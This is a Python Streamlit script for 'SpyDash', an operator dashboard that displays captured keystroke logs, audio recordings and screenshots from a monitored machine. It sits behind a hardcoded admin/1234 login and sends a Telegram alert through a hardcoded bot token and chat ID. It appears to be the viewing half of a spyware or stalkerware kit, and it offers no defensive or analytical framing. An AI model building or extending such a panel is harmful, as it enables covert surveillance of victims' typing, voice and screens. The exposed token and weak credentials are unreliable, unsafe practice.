import streamlit as st
import os
import requests
from PIL import Image

# === Configuração Telegram ===
BOT_TOKEN = "8169475379:AAEM3RqcruOrbFd0dBKUMzwDZ5gRPl-FqxU"
CHAT_ID = "5672315001"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": mensagem}
    try:
        requests.post(url, data=data)
    except:
        pass

# === Login simples ===
USUARIOS = {"admin": "1234"}

def autenticar():
    st.title("🔐 Acesso Restrito - SpyDash")
    usuario = st.text_input("Usuário")
    senha = st.text_input("Senha", type="password")
    if st.button("Entrar"):
        if usuario in USUARIOS and USUARIOS[usuario] == senha:
            st.session_state["logado"] = True
        else:
            st.error("Usuário ou senha incorretos.")

if "logado" not in st.session_state or not st.session_state["logado"]:
    autenticar()
    st.stop()

# === Painel principal ===
st.set_page_config(page_title="SpyDash", layout="wide")
st.title("🕵️ SpyDash - Painel de Monitoramento")
st.markdown("### Capturas em tempo real")
st.write("Este painel exibirá capturas de teclado, áudio e prints do sistema monitorado.")

# Notifica ao Telegram que o painel foi acessado
enviar_telegram("✅ SpyDash foi iniciado e está ao vivo no painel de monitoramento.")

# Exibir arquivos da pasta 'provas'
pasta = "provas"
if not os.path.exists(pasta):
    st.info("Nenhuma captura foi registrada ainda.")
else:
    arquivos = sorted(os.listdir(pasta), reverse=True)
    for arq in arquivos:
        caminho = os.path.join(pasta, arq)
        st.markdown(f"#### 📁 {arq}")
        if arq.endswith(".txt"):
            with open(caminho, "r", encoding="utf-8") as f:
                st.code(f.read(), language="text")
        elif arq.endswith(".wav"):
            st.audio(caminho)
        elif arq.endswith((".png", ".jpg", ".jpeg")):
            st.image(Image.open(caminho))
        st.markdown("---")
